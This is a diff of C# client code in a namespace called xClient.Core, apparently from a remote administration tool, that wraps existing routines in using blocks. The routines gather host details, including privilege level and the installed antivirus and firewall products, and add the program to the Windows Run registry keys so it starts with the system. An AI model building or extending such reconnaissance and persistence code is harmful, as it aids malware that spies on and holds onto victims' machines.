@@ -51,17 +51,19 @@ namespace xClient.Core
 
         public static string GetAccountType()
         {
-            WindowsIdentity identity = WindowsIdentity.GetCurrent();
-            if (identity != null)
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
             {
-                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                if (identity != null)
+                {
+                    WindowsPrincipal principal = new WindowsPrincipal(identity);
 
-                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
-                    return "Admin";
-                if (principal.IsInRole(WindowsBuiltInRole.User))
-                    return "User";
-                if (principal.IsInRole(WindowsBuiltInRole.Guest))
-                    return "Guest";
+                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+                        return "Admin";
+                    if (principal.IsInRole(WindowsBuiltInRole.User))
+                        return "User";
+                    if (principal.IsInRole(WindowsBuiltInRole.Guest))
+                        return "Guest";
+                }
             }
 
             return "Unknown";
@@ -71,18 +73,28 @@ namespace xClient.Core
         {
             try
             {
-                string cpuName = string.Empty;
                 string query = "SELECT * FROM Win32_Processor";
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", query);
-                foreach (ManagementObject mObject in searcher.Get())
-                    cpuName = mObject["Name"].ToString();
-                
-                return cpuName;
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", query))
+                {
+                    string cpuName = string.Empty;
+
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        cpuName = mObject["Name"].ToString();
+
+                        // If a cpu name was found, return the name. Otherwise, we would continue iterating.
+                        if (!string.IsNullOrEmpty(cpuName))
+                        {
+                            return cpuName;
+                        }
+                    }
+                }
             }
             catch
-            {
-                return "Unknown";
-            }
+            { }
+
+            return "Unknown";
         }
 
         public static int GetRam()
@@ -91,11 +103,14 @@ namespace xClient.Core
             {
                 int installedRAM = 0;
                 string query = "Select * From Win32_ComputerSystem";
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-                foreach (ManagementObject mObject in searcher.Get())
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                 {
-                    double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
-                    installedRAM = (int)(bytes / 1048576);
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
+                        installedRAM = (int)(bytes / 1048576);
+                    }
                 }
 
                 return installedRAM;
@@ -112,9 +127,14 @@ namespace xClient.Core
             {
                 string gpuName = string.Empty;
                 string query = "SELECT * FROM Win32_DisplayConfiguration";
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-                foreach (ManagementObject mObject in searcher.Get())
-                    gpuName = mObject["Description"].ToString();
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        gpuName = mObject["Description"].ToString();
+                    }
+                }
 
                 return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
             }
@@ -131,9 +151,14 @@ namespace xClient.Core
                 string antivirusName = string.Empty;
                 string scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string query = "SELECT * FROM AntivirusProduct";
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
-                foreach (ManagementObject mObject in searcher.Get())
-                    antivirusName = mObject["displayName"].ToString();
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        antivirusName = mObject["displayName"].ToString();
+                    }
+                }
 
                 return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
             }
@@ -150,9 +175,14 @@ namespace xClient.Core
                 string firewallName = string.Empty;
                 string scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string query = "SELECT * FROM FirewallProduct";
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
-                foreach (ManagementObject mObject in searcher.Get())
-                    firewallName = mObject["displayName"].ToString();
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        firewallName = mObject["displayName"].ToString();
+                    }
+                }
 
                 return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
             }
@@ -379,19 +409,23 @@ namespace xClient.Core
                 {
                     try // try LocalMachine
                     {
-                        RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        if (key == null) throw new Exception();
-                        key.SetValue(Settings.STARTUPKEY, InstallPath);
-                        key.Close();
+                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        {
+                            if (key == null) throw new Exception();
+                            key.SetValue(Settings.STARTUPKEY, InstallPath);
+                            key.Close();
+                        }
                     }
                     catch // if fails use CurrentUser
                     {
                         try
                         {
-                            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                            if (key == null) throw new Exception();
-                            key.SetValue(Settings.STARTUPKEY, InstallPath);
-                            key.Close();
+                            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                            {
+                                if (key == null) throw new Exception();
+                                key.SetValue(Settings.STARTUPKEY, InstallPath);
+                                key.Close();
+                            }
                         }
                         catch
                         { }
@@ -401,10 +435,12 @@ namespace xClient.Core
                 {
                     try
                     {
-                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        if (key == null) throw new Exception();
-                        key.SetValue(Settings.STARTUPKEY, InstallPath);
-                        key.Close();
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        {
+                            if (key == null) throw new Exception();
+                            key.SetValue(Settings.STARTUPKEY, InstallPath);
+                            key.Close();
+                        }
                     }
                     catch
                     { }
